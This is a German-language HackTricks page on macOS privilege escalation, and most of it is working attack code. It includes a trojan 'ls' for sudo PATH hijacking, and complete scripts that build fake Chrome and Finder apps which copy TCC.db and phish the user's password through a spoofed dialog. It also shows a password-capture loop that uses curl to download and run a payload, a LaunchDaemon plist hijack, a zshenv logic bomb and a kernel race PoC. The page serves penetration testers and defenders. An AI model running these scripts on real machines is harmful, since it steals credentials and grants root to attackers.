# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Falls du wegen TCC privilege escalation hierhergekommen bist, gehe zu:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Beachte, dass **die meisten Tricks zur privilege escalation, die Linux/Unix betreffen, auch macOS**-Maschinen betreffen. Siehe daher:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

Die ursprüngliche [Sudo Hijacking-Technik findest du im Beitrag zur Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

macOS **behält jedoch** den **`PATH`** des Benutzers bei, wenn dieser **`sudo`** ausführt. Das bedeutet, dass eine weitere Möglichkeit, diesen Angriff durchzuführen, darin bestünde, **andere Binaries zu hijacken**, die das Opfer beim **Ausführen von sudo** weiterhin ausführt:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Beachte, dass ein Benutzer, der das Terminal verwendet, höchstwahrscheinlich **Homebrew installiert** haben wird. Daher ist es möglich, Binärdateien in **`/opt/homebrew/bin`** zu hijacken.

### Dock Impersonation

Mithilfe von etwas **social engineering** könntest du beispielsweise **Google Chrome** im Dock **imitieren** und tatsächlich dein eigenes Script ausführen:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Einige Vorschläge:

- Überprüfe im Dock, ob dort Chrome vorhanden ist. Falls ja, **entferne** diesen Eintrag und **füge** den **gefälschten** **Chrome-Eintrag an derselben Position** im Dock-Array hinzu.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Einige Vorschläge:

- Du **kannst Finder nicht aus dem Dock entfernen**, daher könntest du den gefälschten Finder direkt neben den echten Finder im Dock platzieren. Dafür musst du **den Eintrag des gefälschten Finders am Anfang des Dock-Arrays hinzufügen**.
- Eine weitere Option besteht darin, ihn nicht im Dock zu platzieren und ihn einfach zu öffnen. „Finder bittet um die Steuerung von Finder“ ist nicht besonders ungewöhnlich.
- Eine weitere Möglichkeit, **ohne Passwortabfrage zu root zu eskalieren**, ohne eine auffällige Box anzuzeigen, besteht darin, Finder tatsächlich nach dem Passwort für eine privilegierte Aktion fragen zu lassen:
- Finder anweisen, eine neue **`sudo`-Datei** nach **`/etc/pam.d`** zu kopieren. (Die Passwortabfrage zeigt dann an, dass „Finder sudo kopieren möchte“.)
- Finder anweisen, ein neues **Authorization Plugin** zu kopieren. (Du könntest den Dateinamen kontrollieren, sodass die Passwortabfrage anzeigt, dass „Finder Finder.bundle kopieren möchte“.)

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware missbraucht häufig die Benutzerinteraktion, um ein **sudo-fähiges Passwort zu erfassen** und programmgesteuert wiederzuverwenden. Ein üblicher Ablauf:

1. Den angemeldeten Benutzer mit `whoami` identifizieren.
2. **Passwortabfragen wiederholen**, bis `dscl . -authonly "$user" "$pw"` erfolgreich zurückkehrt.
3. Das Credential zwischenspeichern (z. B. `/tmp/.pass`) und privilegierte Aktionen mit `sudo -S` ausführen (Passwort über stdin).

Beispiel für eine minimale Chain:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Das gestohlene Passwort kann anschließend wiederverwendet werden, um die Gatekeeper-Quarantäne mit `xattr -c` zu entfernen, LaunchDaemons oder andere privilegierte Dateien zu kopieren und zusätzliche Stufen nicht interaktiv auszuführen.<sup>[[1]](#references)</sup>

## Neuere macOS-spezifische Vektoren (2023–2025)

### Veraltetes `AuthorizationExecuteWithPrivileges` weiterhin nutzbar

`AuthorizationExecuteWithPrivileges` wurde in 10.7 als veraltet markiert, **funktioniert aber weiterhin unter Sonoma/Sequoia**. Viele kommerzielle Updater rufen `/usr/libexec/security_authtrampoline` mit einem nicht vertrauenswürdigen Pfad auf. Wenn die Ziel-Binärdatei vom Benutzer beschreibbar ist, kann man einen Trojaner platzieren und die legitime Abfrage nutzen:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Kombiniere dies mit den **masquerading tricks oben**, um einen glaubwürdigen Passwortdialog anzuzeigen.


### Privileged helper / XPC-Triage

Viele moderne macOS-Privescs von Drittanbietern folgen demselben Muster: Ein **root LaunchDaemon** stellt einen **Mach/XPC service** aus **`/Library/PrivilegedHelperTools`** bereit; anschließend validiert der Helper entweder den **Client** **nicht**, validiert ihn **zu spät** (PID-Race) oder stellt eine **root method** bereit, die einen **user-controlled path/script** verarbeitet. Diese Bug-Klasse steckt hinter vielen aktuellen Helper-Bugs in VPN-Clients, Game-Launchern und Updatern.<sup>[[2]](#references)</sup>

Kurze Checkliste für die Triage:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Achte besonders auf Helper, die:

- **nach der Deinstallation** weiterhin Requests akzeptieren, weil der Job in `launchd` geladen blieb
- Skripte aus **`/Applications/...`** oder anderen Pfaden ausführen oder Konfigurationen daraus lesen, die für Nicht-root-Benutzer beschreibbar sind
- sich auf eine **PID-basierte** oder **nur anhand der Bundle-ID** erfolgende Peer-Validierung verlassen, die möglicherweise durch eine Race Condition ausnutzbar ist

Weitere Informationen zu Helper-Authorization-Bugs findest du auf [dieser Seite](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Vererbung der PackageKit-Skriptumgebung (CVE-2024-27822)

Bis Apple das Problem in **Sonoma 14.5**, **Ventura 13.6.7** und **Monterey 12.7.5** behoben hatte, konnten vom Benutzer gestartete Installationen über **`Installer.app`** / **`PackageKit.framework`** **PKG-Skripte als root innerhalb der Umgebung des aktuellen Benutzers** ausführen. Das bedeutet, dass ein Package mit **`#!/bin/zsh`** die **`~/.zshenv`** des Angreifers laden und als **root** ausführen konnte, wenn das Opfer das Package installierte.<sup>[[3]](#references)</sup>

Das ist besonders als **logic bomb** interessant: Du benötigst lediglich einen foothold im Benutzerkonto und eine beschreibbare Shell-Startdatei. Danach wartest du, bis ein beliebiger verwundbarer **zsh-basierter** Installer vom Benutzer ausgeführt wird. Dies gilt im Allgemeinen **nicht** für **MDM/Munki**-Deployments, da diese innerhalb der Umgebung des root-Benutzers ausgeführt werden.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Wenn du tiefer in den spezifischen Missbrauch von Installern einsteigen möchtest, sieh dir auch [diese Seite](macos-files-folders-and-binaries/macos-installers-abuse.md) an.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Wenn eine LaunchDaemon-plist oder ihr `ProgramArguments`-Ziel **vom Benutzer beschreibbar** ist, kannst du durch deren Austausch und anschließendes Erzwingen eines Reloads von launchd deine Privilegien erhöhen:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Dies entspricht dem für **CVE-2025-24085** veröffentlichten Exploit-Muster, bei dem eine beschreibbare plist missbraucht wurde, um Angreifer-Code als root auszuführen.

### XNU SMR credential race (CVE-2025-24118)

Ein **Race in `kauth_cred_proc_update`** ermöglicht es einem lokalen Angreifer, den schreibgeschützten Credential-Pointer (`proc_ro.p_ucred`) zu beschädigen, indem `setgid()`-/`getgid()`-Schleifen über mehrere Threads hinweg ausgeführt werden, bis ein inkonsistentes `memcpy` auftritt. Eine erfolgreiche Beschädigung führt zu **uid 0** und Zugriff auf den Kernel-Speicher. Minimale PoC-Struktur:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
In Kombination mit heap grooming, um kontrollierte Daten an der Stelle zu platzieren, an der der Pointer erneut gelesen wird. Auf anfälligen Builds ist dies eine zuverlässige **lokale kernel privesc**, ohne dass SIP-Bypass-Anforderungen bestehen.<sup>[[4]](#references)</sup>

### SIP-Bypass via Migration Assistant ("Migraine", CVE-2023-32369)

Wenn du bereits root hast, blockiert SIP weiterhin Schreibzugriffe auf Systempfade. Der **Migraine**-Bug missbraucht die Migration-Assistant-Entitlement `com.apple.rootless.install.heritable`, um einen Child-Prozess zu starten, der den SIP-Bypass erbt und geschützte Pfade überschreibt (z. B. `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Die Kette:

1. Root auf einem laufenden System erlangen.
2. `systemmigrationd` mit einem manipulierten Status auslösen, sodass eine vom Angreifer kontrollierte Binary ausgeführt wird.
3. Die geerbte Entitlement verwenden, um SIP-geschützte Dateien zu patchen und auch nach einem Neustart persistent zu bleiben.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Mehrere Apple-Daemons akzeptieren **NSPredicate**-Objekte über XPC und validieren lediglich das vom Angreifer kontrollierbare Feld `expressionType`. Durch das Erstellen eines Predicates, das beliebige Selektoren auswertet, kann **code execution in root/system XPC services** erreicht werden (z. B. `coreduetd`, `contextstored`). In Kombination mit einem initialen app sandbox escape ermöglicht dies **privilege escalation ohne Benutzerabfragen**. Suche nach XPC-Endpunkten, die Predicates deserialisieren und keinen robusten Visitor besitzen.<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Jeder Benutzer** (auch Benutzer ohne Privilegien) kann einen Time-Machine-Snapshot mit `-o noowners` erstellen und mounten und auf **ALLE Dateien** dieses Snapshots zugreifen, wodurch die Ownership-Prüfungen auf dem Live-Volume umgangen werden. Das einzige erforderliche Privileg besteht darin, dass die verwendete Anwendung (z. B. `Terminal`) **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`) besitzt.

Die Befehle und die vollständige Erklärung befinden sich auf der TCC bypasses-Seite:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

Dies kann zur privilege escalation nützlich sein:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [1] [Pentest Partners - 2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - A New Privilege Escalation Bug Class on macOS and iOS (CVE-2023-23530/23531)](https://www.trellix.com/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)

{{#include ../../banners/hacktricks-training.md}}
